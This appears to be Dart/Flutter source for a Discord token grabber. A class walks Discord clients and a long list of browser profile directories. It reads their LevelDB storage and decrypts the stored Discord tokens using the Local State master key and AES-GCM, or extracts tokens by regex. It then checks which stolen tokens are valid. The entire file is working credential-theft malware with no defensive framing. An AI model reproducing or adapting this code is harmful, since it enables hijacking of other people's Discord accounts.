import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:cryptography/dart.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

import 'package:cryptography/cryptography.dart';
import 'package:hydra_gui_app/data/user.dart';
import 'package:hydra_helper/hydra_helper.dart';

// import 'package:encrypt/encrypt.dart';

class TokenGrabber {
  String roaming = Platform.environment["APPDATA"].toString();
  String local = Platform.environment["LOCALAPPDATA"].toString();

  late final Map<String, String> _paths = {
    'Discord': roaming + '\\discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Lightcord': roaming + '\\Lightcord',
    'Discord PTB': roaming + '\\discordptb',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
    'Amigo': local + '\\Amigo\\User Data',
    'Torch': local + '\\Torch\\User Data',
    'Kometa': local + '\\Kometa\\User Data',
    'Orbitum': local + '\\Orbitum\\User Data',
    'CentBrowser': local + '\\CentBrowser\\User Data',
    '7Star': local + '\\7Star\\7Star\\User Data',
    'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
    'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': local + '\\Iridium\\User Data\\Default'
  };

  Future<Uint8List?> _getMasterKey(String path) async {
    File file = File(path);
    String content = file.readAsStringSync();
    Uint8List key = base64Decode(json.decode(content)["os_crypt"]["encrypted_key"]).sublist(5);
    final helper = HydraHelper();
    Uint8List? decryptedKey = await helper.decryptMasterKey(key);
    return decryptedKey;
  }

  Future<Uint8List?> _decryptValue(Uint8List buff, Uint8List masterKey) async {
    try{
      Uint8List iv = buff.sublist(3, 15);
      Uint8List mac = buff.sublist(buff.length-16);
      Uint8List payload = buff.sublist(15, buff.length-16);

      SecretBox secretBox = SecretBox(payload, nonce: iv, mac: Mac(mac));
      final cipher = DartAesGcm(secretKeyLength: masterKey.length);
      SecretKey secretKey = SecretKey(masterKey);
      final decrypted = await cipher.decrypt(secretBox, secretKey: secretKey);
      return Uint8List.fromList(decrypted);
    }
    catch(e, st) {
      debugPrint(e.toString());
      debugPrintStack(stackTrace: st);
      return null;
    }
  }

  Future<List<User>> grabTokens() async {
    List<User> users = [];
    
    for (String platform in _paths.keys) {
      // Get paths
      String path = _paths[platform]!;
      String levelDb = path + "\\Local Storage\\leveldb";
      String localState = path + "\\Local State";

      // Check if required paths exists
      if (!Directory(levelDb).existsSync()) continue;
      if (platform.contains("cord") && !File(localState).existsSync()) continue;

      List<String> tokens = [];
      
      // Iterate every file in dir in search of token
      for (FileSystemEntity fileSys in Directory(levelDb).listSync()) {
        if (!fileSys.path.endsWith(".ldb") && !fileSys.path.endsWith(".log")) continue;
        
        try{
          File file = File(fileSys.path);
          // Read file line by line
          for (String line in String.fromCharCodes(file.readAsBytesSync()).split("\n")) {
            String x = line.trim();

            try{
              // If the file is from any of the discord clients
              // then the decryption process is used to obtain the token
              // Decryption Key is stored in Local State file
              if (platform.contains("cord")) {
                String regex = r'dQw4w9WgXcQ:[^\"]*';
                for (RegExpMatch match in RegExp(regex).allMatches(x)) {
                  Uint8List buff = base64Decode(match.group(0)!.split("dQw4w9WgXcQ:")[1]);
                  Uint8List? masterKey = await _getMasterKey(localState);
                  if (masterKey==null) continue;

                  Uint8List? tokenBytes = await _decryptValue(buff, masterKey);
                  if (tokenBytes==null) continue;

                  String token = String.fromCharCodes(tokenBytes);
                  if (!tokens.contains(token)) tokens.add(token);
                }
              }
              
              // If the file is from any of the chromium based browsers
              // then no decryption is required
              // and the tokens can be extracted easily by a regex
              else {
                String regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}";
                for (RegExpMatch match in RegExp(regex).allMatches(x)) {
                  String token = match.group(0)!;
                  if (!tokens.contains(token)) tokens.add(token);
                }
              }
            }catch(e, st) {
              debugPrint(e.toString());
              debugPrintStack(stackTrace: st);
            }

            
            // for (RegExpMatch match in RegExp(reg).allMatches(x)) {
            //   String? token = match.group(0);
            //   if (token!=null && !tokens.contains(token)) tokens.add(token);
            // }
          }
        }

        catch(e, st) {
          debugPrint(e.toString());
          debugPrintStack(stackTrace: st);
        }
      }

      for (String token in tokens) {
        User user = User.fromToken(token, source: platform);
        await user.init();
        if (user.isValid) users.add(user);
      }

    }

    return users;
  }
}